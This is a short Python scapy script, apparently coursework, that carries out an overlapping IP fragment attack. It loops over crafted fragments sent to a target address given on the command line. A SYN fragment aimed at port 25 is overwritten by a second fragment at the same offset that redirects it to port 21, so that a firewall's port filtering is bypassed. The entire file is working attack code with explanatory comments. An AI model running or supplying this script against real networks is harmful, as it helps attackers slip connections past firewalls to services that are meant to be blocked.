from scapy.all import *
import random as rand
dest=str(sys.argv[1])#the user inputs the ip destination as the first argument after the filename when running the attack
nbofpkts=str(sys.argv[2])#the users input the desired number of fragments they'd like to send as the second argument after the destination ip
sport=rand.randint(1024,65535)
for i in range(int(nbofpkts)): #from slides of overlapping fragment attacks
    payload="ATTACK"*20
    payload2="0"*8
    f1 = IP(dst=dest, id=1, frag=0, flags=1)/TCP(sport=sport, dport=25, seq=100, flags="S")/payload #first fragment with offset 0 and length greater than 16, with a SYN flag set to initiate a connection to a port that it can connect to (in this case port number is 25 or SMTP)
    f2 = IP(dst=dest, id=1, frag=0, flags=1)/TCP(dport=21, seq=100)/payload2 #second fragment with offset 0, length 8, and a different port number (21 for FTP) that cannot recieve incomming connections
    f3 = IP(dst=dest, id=1, frag=2, flags=0) #completes the message, final fragment with MF set to 0
    send(f1) #in the lines above, all fragments have equal ids to indicate that they come from the same packet
    send(f2)
    send(f3)
#this will allow us to initiate a connection with a port that is not allowed to accept incomming connection